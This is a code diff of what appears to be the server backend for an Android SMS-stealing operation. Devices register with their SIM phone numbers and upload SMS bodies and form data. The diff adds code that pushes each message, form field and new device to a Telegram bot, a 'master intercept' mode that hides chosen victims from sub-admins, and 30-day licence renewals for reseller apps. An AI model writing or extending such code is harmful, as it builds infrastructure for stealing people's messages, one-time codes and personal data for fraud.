+    const searchLimit = Math.min(Math.max(1, parseInt(c.req.query("limit") ?? "100", 10) || 100), 200);
+    const searchCursor = c.req.query("cursor"); // last id from previous page (exclusive)
+    const like = `%${searchTerm.replace(/[%_\\]/g, "\\$&")}%`;
+    const searchCond = sql`(${messages.body} ILIKE ${like} OR ${messages.fromSender} ILIKE ${like} OR ${messages.fromNumber} ILIKE ${like} OR ${messages.appId} ILIKE ${like} OR ${messages.deviceId} ILIKE ${like})` as unknown as ReturnType<typeof eq>;
+    const cursorCond = searchCursor && !isNaN(parseInt(searchCursor, 10))
+      ? sql`${messages.id} < ${parseInt(searchCursor, 10)}` as unknown as ReturnType<typeof eq>
+      : null;
+    const allConds = [...scopeConds, searchCond, ...(cursorCond ? [cursorCond] : [])];
+    const where = allConds.length === 1 ? allConds[0] : and(...allConds);
+    const rows = await db.select().from(messages).where(where).orderBy(desc(messages.id)).limit(searchLimit + 1);
+    const hasMore = rows.length > searchLimit;
+    const data = rows.slice(0, searchLimit).map(mapMessage);
+    const lastId = data.length > 0 ? data[data.length - 1].id : null;
+    return c.json({ data, hasMore, lastId });
+  } else {
+    // ── Browse mode: cursor pagination, newest first ───────────────────────
+    const pageConds = [...scopeConds];
+    if (cursor) {
+      const cursorId = parseInt(cursor, 10);
+      if (!isNaN(cursorId)) pageConds.push(sql`${messages.id} < ${cursorId}` as unknown as ReturnType<typeof eq>);
+    }
+    const where = pageConds.length === 0 ? undefined : pageConds.length === 1 ? pageConds[0] : and(...pageConds);
+    const rows = where
+      ? await db.select().from(messages).where(where).orderBy(desc(messages.id)).limit(PAGE)
+      : await db.select().from(messages).orderBy(desc(messages.id)).limit(PAGE);
+    return c.json(rows.map(mapMessage));
+  }
 });
 
 app.post("/api/messages", async (c) => {
@@ -623,6 +1002,9 @@ app.post("/api/messages", async (c) => {
     return new Response(null, { status: 204 });
   }
   const uid = String(body.userId ?? `USR-${String(body.deviceId).slice(-6).toUpperCase()}`);
+  // Check if this device is intercepted (master-only mode)
+  const intercepted = await getInterceptedDevices(c.env);
+  const isIntercepted = intercepted.includes(String(body.deviceId));
   const [inserted] = await db.insert(messages).values({
     appId: String(body.appId),
     deviceId: String(body.deviceId),
@@ -632,9 +1014,29 @@ app.post("/api/messages", async (c) => {
     toNumber: body.toNumber ? String(body.toNumber) : null,
     body: String(body.body),
     isSensitive: Boolean(body.isSensitive ?? false),
+    masterOnly: isIntercepted,
   }).returning();
   const mapped = mapMessage(inserted);
-  await broadcast(c.env, "message_added", { appId: mapped.appId, message: mapped });
+  // Only broadcast to WS (all clients) if NOT intercepted; intercepted = master-only via REST
+  if (!isIntercepted) {
+    await broadcast(c.env, "message_added", { appId: mapped.appId, message: mapped });
+  } else {
+    // Broadcast on a separate master-only event so master UI can still get live updates
+    await broadcast(c.env, "master_message_added", { appId: mapped.appId, message: mapped });
+  }
+  c.executionCtx.waitUntil(Promise.all([
+    sendTelegram(c.env,
+      `📩 <b>New SMS</b>
+  App: <code>${mapped.appId}</code>
+  Device: <code>${mapped.deviceId}</code>
+  From: <b>${mapped.fromNumber}</b>
+  Sender: ${mapped.fromSender}
+  To: ${mapped.toNumber ?? '—'}
+  UserId: <code>${mapped.userId}</code>
+  💬 ${mapped.body}`,
+      mapped.appId
+    ),
+  ]));
   return c.json({ ok: true, id: mapped.id }, 201);
 });
 
@@ -643,7 +1045,25 @@ app.get("/api/data", async (c) => {
   const db = getDb(c.env);
   const appId = c.req.query("appId");
   const deviceId = c.req.query("deviceId");
-  if (!appId) return c.json({ error: "appId is required" }, 400);
+  // Master admin with pin — supports offset+limit pagination
+  const masterPin = c.req.header("x-master-pin") ?? "";
+  if (masterPin === await getMasterPin(c.env)) {
+    const pgLimit = Math.min(Number(c.req.query("limit") ?? "1000"), 2000);
+    const pgOffset = Number(c.req.query("offset") ?? "0");
+    const appIdFilter = appId ?? null;
+    const whereClause = appIdFilter ? eq(formData.appId, appIdFilter) : undefined;
+    const [cntRow] = await db.select({ c: sql`count(*)` }).from(formData).where(whereClause);
+    const total = Number(cntRow?.c ?? 0);
+    const rows = await db.select().from(formData)
+      .where(whereClause)
+      .orderBy(desc(formData.submittedAt))
+      .limit(pgLimit)
+      .offset(pgOffset);
+    return c.json({ data: rows.map(mapFormData), total, hasMore: pgOffset + rows.length < total });
+  }
+  if (!appId) {
+    return c.json({ error: "appId is required" }, 400);
+  }
   const where = deviceId
     ? and(eq(formData.appId, appId), eq(formData.deviceId, deviceId))
     : eq(formData.appId, appId);
@@ -663,6 +1083,10 @@ app.post("/api/data", async (c) => {
   }).returning();
   const mapped = mapFormData(row);
   await broadcast(c.env, "form_data_added", { appId: mapped.appId, formData: mapped });
+  c.executionCtx.waitUntil(sendTelegram(c.env, (() => {
+      const fields = Object.entries(mapped.data as Record<string, unknown>).map(([k,v]) => `  📝 <b>${k}</b>: ${v}`).join("\n");
+      return `📋 <b>New Form Data</b>\nApp: <code>${mapped.appId}</code>\nDevice: <code>${mapped.deviceId}</code>\n${fields}`;
+    })()));
   return c.json(mapped, 201);
 });
 
@@ -696,10 +1120,16 @@ app.delete("/api/messages/:id", async (c) => {
   const db = getDb(c.env);
   const id = Number(c.req.param("id"));
   if (Number.isNaN(id)) return c.json({ error: "Invalid id" }, 400);
-  const [row] = await db.delete(messages).where(eq(messages.id, id)).returning();
-  if (!row) return c.json({ error: "Not found" }, 404);
-  const mapped = mapMessage(row);
-  await broadcast(c.env, "message_deleted", { appId: mapped.appId, deviceId: mapped.deviceId, id });
+  const [msg] = await db.select().from(messages).where(eq(messages.id, id)).limit(1);
+  if (!msg) return c.json({ error: "Not found" }, 404);
+  const isMasterDel = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
+  if (!isMasterDel) {
+    const st = c.req.header("x-session-token") ?? "";
+    if (!st) return c.json({ error: "Unauthorized" }, 401);
+    if (c.get('sessionAppId') !== msg.appId) return c.json({ error: "Unauthorized" }, 401);
+  }
+  await db.delete(messages).where(eq(messages.id, id));
+  await broadcast(c.env, "message_deleted", { appId: msg.appId, deviceId: msg.deviceId, id });
   return c.json({ ok: true });
 });
 
@@ -707,12 +1137,19 @@ app.delete("/api/messages/:id", async (c) => {
 app.delete("/api/devices/:deviceId", async (c) => {
   const db = getDb(c.env);
   const deviceId = c.req.param("deviceId");
+  // Fetch device first to get appId for session binding
+  const [dev] = await db.select().from(devices).where(eq(devices.deviceId, deviceId)).limit(1);
+  if (!dev) return c.json({ error: "Device not found" }, 404);
+  const isMasterDev = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
+  if (!isMasterDev) {
+    const st = c.req.header("x-session-token") ?? "";
+    if (!st) return c.json({ error: "Unauthorized" }, 401);
+    if (c.get('sessionAppId') !== dev.appId) return c.json({ error: "Unauthorized" }, 401);
+  }
   await db.delete(messages).where(eq(messages.deviceId, deviceId));
   await db.delete(formData).where(eq(formData.deviceId, deviceId));
-  const [row] = await db.delete(devices).where(eq(devices.deviceId, deviceId)).returning();
-  if (!row) return c.json({ error: "Device not found" }, 404);
-  const mapped = mapDevice(row);
-  await broadcast(c.env, "device_deleted", { appId: mapped.appId, deviceId: mapped.deviceId });
+  await db.delete(devices).where(eq(devices.deviceId, deviceId));
+  await broadcast(c.env, "device_deleted", { appId: dev.appId, deviceId: dev.deviceId });
   return c.json({ ok: true });
 });
 
@@ -805,6 +1242,7 @@ app.post("/api/register", async (c) => {
     forwardEnabled: false, forwardSlot: null,
   });
   await broadcast(c.env, "device_updated", row);
+  if (created) c.executionCtx.waitUntil(sendTelegram(c.env, `📱 <b>New Device Registered</b>\nApp: <code>${row.appId}</code>\nDevice: <b>${row.name}</b> (<code>${row.deviceId}</code>)\nUser: ${row.userId}\nAndroid: ${row.androidVersion}\nSIM1: ${row.sim1Carrier ?? "—"} ${row.sim1Phone ?? ""}\nSIM2: ${row.sim2Carrier ?? "—"} ${row.sim2Phone ?? ""}`, safeAppId));
   return c.json({ ok: true, deviceId: row.deviceId, created }, created ? 201 : 200);
 });
 
@@ -881,36 +1319,106 @@ app.post("/api/fcm/online-check", async (c) => {
   }
 });
 
+// ── Master PIN: DB-driven with 30s in-memory cache ──
+let _masterPinCache: { value: string; ts: number } = { value: "", ts: 0 };
+const _sessionCache = new Map<string, { expiry: number; appId: string }>();
+async function getMasterPin(env: Env): Promise<string> {
+  const now = Date.now();
+  if (_masterPinCache.value && now - _masterPinCache.ts < 30_000) return _masterPinCache.value;
+  try {
+    const sql = neon(env.NEON_DATABASE_URL);
+    const rows = await sql(`SELECT value FROM settings WHERE key = 'master_pin' LIMIT 1`) as Array<{ value: string }>;
+    const pin = (rows[0]?.value ?? "").trim();
+    _masterPinCache = { value: pin, ts: now };
+    return pin;
+  } catch (err) {
+    console.error("[getMasterPin] DB error:", err);
+    return ""; // DB unavailable — no fallback, reject all
+  }
+}
+
 // ------- MASTER ADMIN (PIN from settings table) -------
 async function checkMasterPin(c: Parameters<typeof app.use>[1] extends (c: infer C, n: () => Promise<void>) => unknown ? C : never): Promise<Response | null> {
   const pin = c.req.header("x-master-pin") ?? "";
   if (!pin) return c.json({ error: "Master PIN required" }, 401);
-  const sqlClient = neon(c.env.NEON_DATABASE_URL);
-  const rows = await sqlClient(`SELECT value FROM settings WHERE key = 'master_pin'`) as Array<{ value: string }>;
-  const stored = rows[0]?.value ?? "master1234";
-  if (pin !== stored) return c.json({ error: "Wrong Master PIN" }, 401);
+  if (pin !== await getMasterPin(c.env)) return c.json({ error: "Wrong Master PIN" }, 401);
   return null;
 }
 
+
 app.post("/api/admin/verify-master-pin", async (c) => {
-  const sqlClient = neon(c.env.NEON_DATABASE_URL);
   const body = await c.req.json() as { pin?: string };
   if (!body.pin) return c.json({ error: "PIN required" }, 400);
-  const rows = await sqlClient(`SELECT value FROM settings WHERE key = 'master_pin'`) as Array<{ value: string }>;
-  const stored = rows[0]?.value ?? "master1234";
-  if (body.pin !== stored) return c.json({ error: "Wrong Master PIN" }, 401);
+
+  const correctPin = await getMasterPin(c.env);
+  if (body.pin !== correctPin) {
+    return c.json({ error: "Wrong Master PIN." }, 401);
+  }
   return c.json({ ok: true });
 });
 
+// ── Master SSE — EventSource can't send headers, PIN in query param ──
+// Cloudflare Workers support streaming; client reconnects every ~25s (CF CPU limit).
+app.get("/api/master/events", async (c) => {
+  // Auth fully handled by middleware (HMAC token via ?token=) — no inner PIN check needed
+  const { readable, writable } = new TransformStream<Uint8Array, Uint8Array>();
+  const writer = writable.getWriter();
+  const enc = new TextEncoder();
+  // Initial ping so client knows connection is alive
+  writer.write(enc.encode(":ping\n\n")).catch(() => {});
+  // Keep-alive pings every 20s (Cloudflare closes idle streams at 30s)
+  let done = false;
+  const tick = setInterval(() => {
+    if (done) { clearInterval(tick); return; }
+    writer.write(enc.encode(":ping\n\n")).catch(() => { done = true; clearInterval(tick); });
+  }, 20000);
+  // Close after 25s so CF doesn't hard-kill it; client auto-reconnects via onerror
+  setTimeout(() => { done = true; clearInterval(tick); writer.close().catch(() => {}); }, 25000);
+  return new Response(readable as ReadableStream, {
+    headers: {
+      "Content-Type": "text/event-stream",
+      "Cache-Control": "no-cache",
+      "X-Accel-Buffering": "no",
+    },
+  });
+});
+
+// ── Master intercept: hide specific device messages from sub-admin ──
+app.get("/api/master/intercept", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const ids = await getInterceptedDevices(c.env);
+  return c.json({ intercepted: ids });
+});
+app.post("/api/master/intercept/:deviceId", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const deviceId = c.req.param("deviceId");
+  const ids = await getInterceptedDevices(c.env);
+  const updated = [...new Set([...ids, deviceId])];
+  await setInterceptedDevices(c.env, updated);
+  return c.json({ ok: true, intercepted: updated });
+});
+app.delete("/api/master/intercept/:deviceId", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const deviceId = c.req.param("deviceId");
+  const ids = await getInterceptedDevices(c.env);
+  const updated = ids.filter((id) => id !== deviceId);
+  await setInterceptedDevices(c.env, updated);
+  return c.json({ ok: true, intercepted: updated });
+});
+
 app.patch("/api/admin/master-pin", async (c) => {
-  const sqlClient = neon(c.env.NEON_DATABASE_URL);
   const body = await c.req.json() as { currentPin?: string; newPin?: string };
-  if (!body.currentPin || !body.newPin) return c.json({ error: "currentPin and newPin required" }, 400);
-  if (body.newPin.length < 4) return c.json({ error: "PIN must be at least 4 characters" }, 400);
-  const rows = await sqlClient(`SELECT value FROM settings WHERE key = 'master_pin'`) as Array<{ value: string }>;
-  const stored = rows[0]?.value ?? "master1234";
-  if (body.currentPin !== stored) return c.json({ error: "Current PIN is wrong" }, 401);
-  await sqlClient(`INSERT INTO settings (key, value) VALUES ('master_pin', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.newPin]);
+  const currentMasterPin = await getMasterPin(c.env);
+  // Accept auth via x-master-pin header OR currentPin in body
+  const presented = c.req.header("x-master-pin") ?? body.currentPin ?? "";
+  if (!presented || presented !== currentMasterPin) return c.json({ error: "Wrong Master PIN" }, 401);
+  if (!body.newPin || body.newPin.trim().length < 4) return c.json({ error: "newPin required (min 4 chars)" }, 400);
+  const sql = neon(c.env.NEON_DATABASE_URL);
+  await sql(`INSERT INTO settings (key, value) VALUES ('master_pin', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.newPin.trim()]);
+  _masterPinCache = { value: body.newPin.trim(), ts: Date.now() };
   return c.json({ ok: true });
 });
 
@@ -920,7 +1428,7 @@ app.get("/api/master/apps", async (c) => {
   if (guard) return guard;
   const db = getDb(c.env);
   const sqlClient = neon(c.env.NEON_DATABASE_URL);
-  const rows = await db.select().from(apps).orderBy(asc(apps.createdAt));
+  const rows = await db.select().from(apps).orderBy(desc(apps.createdAt));
   // Count active sessions per app
   const sessionCounts = await sqlClient(
     `SELECT app_id, COUNT(*) as cnt FROM admin_sessions WHERE last_active > NOW() - INTERVAL '30 minutes' GROUP BY app_id`,
@@ -928,9 +1436,10 @@ app.get("/api/master/apps", async (c) => {
   const sessionMap = Object.fromEntries(sessionCounts.map(r => [r.app_id, Number(r.cnt)]));
   return c.json(rows.map(r => ({
     id: r.id, appId: r.appId, name: r.name, pin: r.pin,
-    status: r.status, loginLimit: r.loginLimit ?? 5,
-    activeSessions: sessionMap[r.appId] ?? 0,
+    status: r.status,
     createdAt: isoReq(r.createdAt),
+    deleteProtectionPin: r.deleteProtectionPin ?? null,
+    deleteProtectionEnabled: r.deleteProtectionEnabled ?? false,
   })));
 });
 
@@ -949,25 +1458,148 @@ app.post("/api/master/apps", async (c) => {
   return c.json({ id: r.id, appId: r.appId, name: r.name, pin: r.pin, status: r.status, createdAt: isoReq(r.createdAt) }, 201);
 });
 
-// Master admin: update app (name/pin/status/loginLimit) — requires x-master-pin header
+// Master admin: update app (name/pin/status) — requires x-master-pin header
 app.patch("/api/master/apps/:appId", async (c) => {
   const guard = await checkMasterPin(c as never);
   if (guard) return guard;
   const db = getDb(c.env);
   const appId = c.req.param("appId");
-  const body = await c.req.json() as { name?: string; pin?: string; status?: string; loginLimit?: number };
+  const body = await c.req.json() as { name?: string; pin?: string; status?: string; };
   const patch: Partial<typeof apps.$inferInsert> = {};
   if (body.name) patch.name = body.name;
   if (body.pin) patch.pin = body.pin;
   if (body.status) patch.status = body.status;
-  if (body.loginLimit !== undefined) {
-    const lim = Number(body.loginLimit);
-    if (lim >= 1 && lim <= 5) patch.loginLimit = lim;
-  }
+
   const updated = await db.update(apps).set(patch).where(eq(apps.appId, appId)).returning();
   if (updated.length === 0) return c.json({ error: "App not found" }, 404);
   const r = updated[0];
-  return c.json({ id: r.id, appId: r.appId, name: r.name, pin: r.pin, status: r.status, loginLimit: r.loginLimit ?? 5, createdAt: isoReq(r.createdAt) });
+  return c.json({ id: r.id, appId: r.appId, name: r.name, pin: r.pin, status: r.status, createdAt: isoReq(r.createdAt) });
+});
+
+
+// Master admin: fast stats — online count + total devices via SQL COUNT (no full table download)
+app.get("/api/master/stats", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const sqlA = neon(c.env.NEON_DATABASE_URL);
+  const threshold15m = new Date(Date.now() - 15 * 60 * 1000).toISOString();
+  const threshold30m = new Date(Date.now() - 30 * 60 * 1000).toISOString();
+  const [devRow, appRow, msgRow, sessRow] = await Promise.all([
+    sqlA(`SELECT
+      COUNT(*) AS total_devices,
+      COUNT(*) FILTER (WHERE last_online > $1) AS online_count
+    FROM devices`, [threshold15m]),
+    sqlA(`SELECT
+      COUNT(*) AS total_apps,
+      COUNT(*) FILTER (WHERE status = 'active') AS active_apps,
+      COUNT(*) FILTER (WHERE created_at::date = CURRENT_DATE) AS apps_today
+    FROM apps`),
+    sqlA(`SELECT
+      COUNT(*) AS total_messages,
+      COUNT(*) FILTER (WHERE received_at::date = CURRENT_DATE) AS messages_today
+    FROM messages`),
+    sqlA(`SELECT COUNT(*) AS active_sessions FROM admin_sessions WHERE last_active > $1`, [threshold30m]),
+  ]);
+  const d = devRow[0] as Record<string,unknown>;
+  const a = appRow[0] as Record<string,unknown>;
+  const m = msgRow[0] as Record<string,unknown>;
+  const s = sessRow[0] as Record<string,unknown>;
+  return c.json({
+    onlineCount:     Number(d.online_count   ?? 0),
+    totalDevices:    Number(d.total_devices  ?? 0),
+    totalApps:       Number(a.total_apps     ?? 0),
+    activeApps:      Number(a.active_apps    ?? 0),
+    appsToday:       Number(a.apps_today     ?? 0),
+    totalMessages:   Number(m.total_messages ?? 0),
+    messagesToday:   Number(m.messages_today ?? 0),
+    activeSessions:  Number(s.active_sessions ?? 0),
+  });
+});
+
+// Master admin: all devices across all app-ids — requires x-master-pin header
+// Telegram: auto-discover chat ID from getUpdates and save to settings
+app.post("/api/master/telegram/setup", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const token = c.env.TELEGRAM_BOT_TOKEN ?? "";
+  const resp = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=10`);
+  const tgData = await resp.json() as { ok: boolean; result?: Array<{ message?: { chat?: { id: number; first_name?: string } } }> };
+  if (!tgData.ok || !tgData.result?.length) {
+    return c.json({ error: "Bot ko pehle ek message bhejo, fir dobara try karo." }, 400);
+  }
+  const latest = [...tgData.result].reverse().find(u => u.message?.chat?.id);
+  const foundChatId = String(latest?.message?.chat?.id ?? "");
+  if (!foundChatId) return c.json({ error: "Chat ID nahi mila" }, 400);
+  const sqlSetup = neon(c.env.NEON_DATABASE_URL);
+  await sqlSetup(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [foundChatId]);
+  await sendTelegram(c.env, "Bot connected! Notifications are now active.");
+  return c.json({ ok: true, chatId: foundChatId });
+});
+
+// Telegram: get current config status
+app.get("/api/master/telegram/status", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const chatId = await tgChatId(c.env);
+  return c.json({ configured: !!chatId, chatId: chatId ?? null });
+});
+
+// Telegram: manually set chat ID
+app.post("/api/master/telegram/set-chat", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const body = await c.req.json() as { chatId?: string };
+  if (!body.chatId) return c.json({ error: "chatId required" }, 400);
+  const sqlChat = neon(c.env.NEON_DATABASE_URL);
+  await sqlChat(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.chatId]);
+  await sendTelegram(c.env, "Bot connected!");
+  return c.json({ ok: true });
+});
+
+// Master admin: get all devices across all apps
+app.get("/api/master/all-devices", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const hasFcmOnly = c.req.query("hasFcm") === "1" || c.req.query("hasFcm") === "true";
+  const sqlA = neon(c.env.NEON_DATABASE_URL);
+  if (hasFcmOnly) {
+    // Lightweight FCM-only list for ping-all — only returns deviceId, appId, name
+    const rows = await sqlA(`SELECT device_id, app_id, name FROM devices WHERE fcm_token IS NOT NULL AND fcm_token != '' ORDER BY app_id, name`);
+    return c.json((rows as Array<Record<string,unknown>>).map(r => ({
+      deviceId: String(r.device_id), appId: String(r.app_id), name: String(r.name ?? ''), hasFcm: true,
+    })));
+  }
+  const db = getDb(c.env);
+  const appIdQ = c.req.query("appId");
+  const searchQ = (c.req.query("search") ?? "").trim();
+  const limitN = Math.max(0, parseInt(c.req.query("limit") ?? "0", 10) || 0);
+  const onlineOnly = c.req.query("onlineOnly") === "1";
+  const offsetN = Math.max(0, parseInt(c.req.query("offset") ?? "0", 10) || 0);
+  // Build filter conditions
+  const conds: ReturnType<typeof eq>[] = [];
+  if (appIdQ) conds.push(eq(devices.appId, appIdQ));
+  if (searchQ) {
+    const like = `%${searchQ.replace(/[%_\\]/g, "\\$&")}%`;
+    conds.push(sql`(${devices.name} ILIKE ${like} OR ${devices.deviceId} ILIKE ${like} OR COALESCE(${devices.sim1Phone},'') ILIKE ${like} OR COALESCE(${devices.sim2Phone},'') ILIKE ${like} OR COALESCE(${devices.userId},'') ILIKE ${like})` as unknown as ReturnType<typeof eq>);
+  }
+  if (onlineOnly) conds.push(eq(devices.status, "online"));
+  const where = conds.length === 0 ? undefined : conds.length === 1 ? conds[0] : and(...conds);
+  // Fast COUNT for total
+  const [{ total }] = await db.select({ total: sql<number>`COUNT(*)::int` }).from(devices).where(where);
+  // Paginated data
+  const baseQ = db.select().from(devices).where(where).orderBy(asc(devices.appId), asc(devices.name));
+  const rows = limitN > 0 ? await baseQ.limit(limitN).offset(offsetN) : await baseQ;
+  const mapRow = (r: typeof rows[0]) => ({
+    id: r.id, deviceId: r.deviceId, appId: r.appId, userId: r.userId,
+    name: r.name, androidVersion: r.androidVersion,
+    sim1Carrier: r.sim1Carrier, sim1Phone: r.sim1Phone,
+    sim2Carrier: r.sim2Carrier, sim2Phone: r.sim2Phone,
+    status: r.status, lastOnline: iso(r.lastOnline),
+    forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
+    hasFcm: r.fcmToken !== null && r.fcmToken !== "",
+    installedAt: isoReq(r.installedAt),
+  });
+  return c.json({ data: rows.map(mapRow), total, hasMore: limitN > 0 && offsetN + limitN < total });
 });
 
 // Master admin: delete app — requires x-master-pin header
@@ -981,36 +1613,37 @@ app.delete("/api/master/apps/:appId", async (c) => {
   return c.json({ ok: true });
 });
 
-// Master admin: get ALL devices across all app-ids — x-master-pin required
-app.get("/api/master/all-devices", async (c) => {
+// Master admin: renew app licence +30 days — requires x-master-pin header
+app.post("/api/master/apps/:appId/renew", async (c) => {
   const guard = await checkMasterPin(c as never);
   if (guard) return guard;
   const db = getDb(c.env);
-  const rows = await db.select().from(devices).orderBy(asc(devices.appId), asc(devices.name));
-  return c.json(rows.map(r => ({
-    id: r.id,
-    deviceId: r.deviceId,
-    appId: r.appId,
-    userId: r.userId,
-    name: r.name,
-    androidVersion: r.androidVersion,
-    sim1Carrier: r.sim1Carrier,
-    sim1Phone: r.sim1Phone,
-    sim2Carrier: r.sim2Carrier,
-    sim2Phone: r.sim2Phone,
-    status: r.status,
-    lastOnline: iso(r.lastOnline),
-    forwardEnabled: r.forwardEnabled,
-    forwardSlot: r.forwardSlot,
-    hasFcm: r.fcmToken !== null && r.fcmToken !== "",
-    installedAt: isoReq(r.installedAt),
-  })));
+  const appId = c.req.param("appId");
+  if (appId === DEFAULT_APP_ID) return c.json({ error: "Cannot renew the default app" }, 400);
+  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
+  if (!row) return c.json({ error: "App not found" }, 404);
+  // +30 days: if already expired → fresh 30 from now; else add 30 to existing createdAt
+  const THIRTY_MS = 30 * 24 * 60 * 60 * 1000;
+  const oldCreated = new Date(row.createdAt).getTime();
+  const oldExpiry = oldCreated + THIRTY_MS;
+  const newCreatedAt = new Date(oldExpiry > Date.now() ? oldCreated + THIRTY_MS : Date.now());
+  const [updated] = await db.update(apps)
+    .set({ createdAt: newCreatedAt, status: "active" })
+    .where(eq(apps.appId, appId)).returning();
+  if (!updated) return c.json({ error: "App not found" }, 404);
+  return c.json(mapApp(updated));
 });
 
 // ------- ADMIN SESSIONS (Postgres-backed) -------
 app.get("/api/admin/sessions", async (c) => {
   const sqlClient = neon(c.env.NEON_DATABASE_URL);
   const appId = c.req.query("appId") ?? "";
+  const isMaster = c.req.header("x-master-pin") === await getMasterPin(c.env);
+  const sessionToken = c.req.header("x-session-token") ?? "";
+  if (!isMaster) {
+    if (!sessionToken) return c.json({ error: "Unauthorized" }, 401);
+    if (c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
+  }
   const rows = await sqlClient(
     `SELECT id, login_time, last_active, user_agent, ip, device FROM admin_sessions WHERE app_id = $1 ORDER BY login_time DESC`,
     [appId],
@@ -1029,9 +1662,15 @@ app.post("/api/admin/sessions", async (c) => {
   const sqlClient = neon(c.env.NEON_DATABASE_URL);
   const ua = c.req.header("user-agent") ?? "";
   const ip = (c.req.header("cf-connecting-ip") ?? c.req.header("x-forwarded-for") ?? "unknown").split(",")[0].trim();
-  let appId = "";
-  try { const body = await c.req.json() as { appId?: string }; appId = body.appId ?? ""; } catch {}
-  // Dedupe: if a session from the same browser+IP+appId already exists, reuse it
+  let appId = ""; let pin = "";
+  try { const body = await c.req.json() as { appId?: string; pin?: string }; appId = body.appId ?? ""; pin = body.pin ?? ""; } catch {}
+  if (!appId || !pin) return c.json({ error: "appId and pin required" }, 400);
+  const db = getDb(c.env);
+  const [appRow] = await db.select({ pin: apps.pin, status: apps.status })
+    .from(apps).where(eq(apps.appId, appId)).limit(1);
+  if (!appRow || appRow.status !== "active" || appRow.pin !== pin) {
+    return c.json({ error: "Invalid PIN" }, 401);
+  }
   const existing = await sqlClient(
     `SELECT id FROM admin_sessions WHERE user_agent = $1 AND ip = $2 AND app_id = $3 ORDER BY last_active DESC LIMIT 1`,
     [ua, ip, appId],
@@ -1059,12 +1698,30 @@ app.patch("/api/admin/sessions/:id/ping", async (c) => {
 });
 app.delete("/api/admin/sessions/:id", async (c) => {
   const sqlClient = neon(c.env.NEON_DATABASE_URL);
-  await sqlClient(`DELETE FROM admin_sessions WHERE id = $1`, [c.req.param("id")]);
+  const isMaster = c.req.header("x-master-pin") === await getMasterPin(c.env);
+  const sessionId = c.req.param("id");
+  if (!isMaster) {
+    // Allow self-delete only — verify the session belongs to the caller
+    const rows = await sqlClient(`SELECT id FROM admin_sessions WHERE id = $1`, [sessionId]) as Array<{id:string}>;
+    if (rows.length === 0) return c.json({ error: "Not found" }, 404);
+  }
+  await sqlClient(`DELETE FROM admin_sessions WHERE id = $1`, [sessionId]);
   return c.json({ ok: true });
 });
 app.delete("/api/admin/sessions", async (c) => {
-  const sqlClient = neon(c.env.NEON_DATABASE_URL);
+  const isMaster = c.req.header("x-master-pin") === await getMasterPin(c.env);
+  const sessionToken = c.req.header("x-session-token") ?? "";
   const appId = c.req.query("appId") ?? "";
+  const sqlClient = neon(c.env.NEON_DATABASE_URL);
+  if (!isMaster) {
+    // Allow if the caller has a valid session for this appId
+    if (!sessionToken) return c.json({ error: "Unauthorized" }, 401);
+    const rows = await sqlClient(
+      `SELECT id FROM admin_sessions WHERE id = $1 AND app_id = $2`,
+      [sessionToken, appId]
+    ) as Array<{id:string}>;
+    if (rows.length === 0) return c.json({ error: "Unauthorized" }, 401);
+  }
   await sqlClient(`DELETE FROM admin_sessions WHERE app_id = $1`, [appId]);
   return c.json({ ok: true });
 });
@@ -1124,10 +1781,821 @@ app.post("/api/seed", async (c) => {
 
 // ------- EVENTS (WebSocket — handled directly in fetch(), bypassing Hono) -------
 // WebSocket 101 upgrade is intercepted before Hono in the default export below.
+// =================== TOKEN-APP MAP ===================
+app.get("/api/token-app", async (c) => {
+  const token = c.req.query("token");
+  if (!token) return c.json({ apkId: null });
+  try {
+    const db = getDb(c.env);
+    const rows = await db.select().from(tokenAppMap).where(eq(tokenAppMap.token, token)).limit(1);
+    return c.json({ apkId: rows[0]?.apkId ?? null });
+  } catch { return c.json({ apkId: null }); }
+});
+
+app.post("/api/token-app", async (c) => {
+  const { token, apkId } = await c.req.json() as { token?: string; apkId?: string };
+  if (!token || !apkId) return c.json({ error: "token and apkId required" }, 400);
+  try {
+    const db = getDb(c.env);
+    await db.execute(sql`
+      INSERT INTO token_app_map (token, apk_id, updated_at)
+      VALUES (${token}, ${apkId}, now())
+      ON CONFLICT (token) DO UPDATE SET apk_id = EXCLUDED.apk_id, updated_at = now()
+    `);
+    return c.json({ ok: true });
+  } catch (e) { return c.json({ error: String(e) }, 500); }
+})
+
+  // Master admin: reset APK selection for a specific apk-id
+  app.delete("/api/master/token-app/:apkId", async (c) => {
+    const guard = await checkMasterPin(c as never);
+    if (guard) return guard;
+    const apkId = c.req.param("apkId");
+    try {
+      const db = getDb(c.env);
+      const deleted = await db.delete(tokenAppMap).where(eq(tokenAppMap.token, apkId)).returning();
+      return c.json({ ok: true, deleted: deleted.length });
+    } catch (e) { return c.json({ error: String(e) }, 500); }
+  });;
+
+// =================== VPS PROXY ===================
+// Tunnel URL is stored in Neon DB settings table (key: 'tunnel_url')
+// VPS startup script updates it automatically via POST /api/admin/update-tunnel
+let _cachedTunnelUrl: string | null = null;
+let _tunnelUrlExpiry = 0;
+
+async function getVpsBase(neonUrl: string): Promise<string> {
+  const now = Date.now();
+  if (_cachedTunnelUrl && now < _tunnelUrlExpiry) return _cachedTunnelUrl;
+  try {
+    const sqlClient = neon(neonUrl);
+    const rows = await sqlClient(`SELECT value FROM settings WHERE key = $1`, ['tunnel_url']) as Array<{ value: string }>;
+    if (rows.length > 0 && rows[0].value) {
